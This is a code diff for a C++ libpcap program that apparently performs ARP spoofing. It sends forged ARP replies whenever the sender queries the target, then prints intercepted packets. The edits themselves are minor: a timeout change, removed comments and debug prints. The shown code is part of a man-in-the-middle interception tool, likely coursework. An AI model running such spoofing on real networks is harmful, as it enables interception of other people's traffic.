@@ -162,15 +162,15 @@ void send_arp_reply_loop(const char* dev, Mac my_mac, Ip target_ip, Mac sender_m
     }
 
     time_t last_arp_reply_time = time(nullptr);
-    const int arp_cache_timeout = 20; // Example: send ARP every 20 seconds if no requests seen
+    const int arp_cache_timeout = 50;
 
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet_data;
 
         int res = pcap_next_ex(handle, &header, &packet_data);
-        if (res == 0) continue;  // Timeout elapsed
-        if (res == -1 || res == -2) break;  // Error or EOF
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
 
         EthHdr* eth_hdr = (EthHdr*)packet_data;
 
@@ -183,9 +183,12 @@ void send_arp_reply_loop(const char* dev, Mac my_mac, Ip target_ip, Mac sender_m
                 Ip arp_sender_ip = Ip(arp_hdr->sip());
                 Ip arp_target_ip = Ip(arp_hdr->tip());
 
+                // printf("ARP request from %s to %s\n", std::string(arp_sender_ip).c_str(), std::string(arp_target_ip).c_str());
+
                 // Check if this ARP is related to the IPs we're spoofing
                 if (arp_target_ip == target_ip && arp_sender_ip == sender_ip) {
-                    // Send ARP reply if we detect a relevant ARP request
+                    // Send ARP reply if detedted ARP request from sender
+                    printf("Triggered!\n");
                     send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
                     last_arp_reply_time = time(nullptr);
                     printf("Sent ARP reply due to ARP request from %s\n", std::string(sender_ip).c_str());
@@ -207,10 +210,10 @@ void send_arp_reply_loop(const char* dev, Mac my_mac, Ip target_ip, Mac sender_m
 
 void print_packet_data(const u_char* data, int size) {
     for (int i = 0; i < size; i++) {
-        if (i != 0 && i % 16 == 0) { // Print new line after every 16 bytes
+        if (i != 0 && i % 16 == 0) {
             printf("         ");
             for (int j = i - 16; j < i; j++) {
-                if (data[j] >= 32 && data[j] <= 128) // Print ASCII values
+                if (data[j] >= 32 && data[j] <= 128)
                     printf("%c", (unsigned char)data[j]);
                 else
                     printf(".");
@@ -221,7 +224,7 @@ void print_packet_data(const u_char* data, int size) {
         if (i % 16 == 0) printf("   ");
         printf(" %02X", (unsigned int)data[i]);
 
-        if (i == size - 1) { // Print the last spaces
+        if (i == size - 1) {
             for (int j = 0; j < 15 - i % 16; j++) {
                 printf("   ");
             }
@@ -306,7 +309,6 @@ int main(int argc, char* argv[]) {
             continue;
         }
         send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
-        printf("here\n");
         std::thread arp_thread(send_arp_reply_loop, dev, my_mac, target_ip, sender_mac, sender_ip);
         arp_thread.detach(); 
     }
@@ -319,8 +321,8 @@ int main(int argc, char* argv[]) {
         const u_char* packet_data;
 
         int res = pcap_next_ex(handle, &header, &packet_data);
-        if (res == 0) continue;  // Timeout elapsed
-        if (res == -1 || res == -2) break;  // Error or EOF
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
 
         EthHdr* eth_hdr = (EthHdr*)packet_data;
 
@@ -331,7 +333,7 @@ int main(int argc, char* argv[]) {
             Ip sender_ip = ip_hdr->sip();
             Ip target_ip = ip_hdr->dip();
 
-            printf("Sender IP: %s, Target IP: %s\n", std::string(sender_ip).c_str(), std::string(target_ip).c_str());
+            // printf("Sender IP: %s, Target IP: %s\n", std::string(sender_ip).c_str(), std::string(target_ip).c_str());
 
             // Check if we know the MAC address of the sender
             auto sender_it = sender_ip_mac_map.find(sender_ip);
@@ -358,7 +360,7 @@ int main(int argc, char* argv[]) {
             }
 
             if (!is_target_valid) {
-                continue;  // Skip this packet as it's not meant for the intended target
+                continue;
             }
 
             // Print the packet content
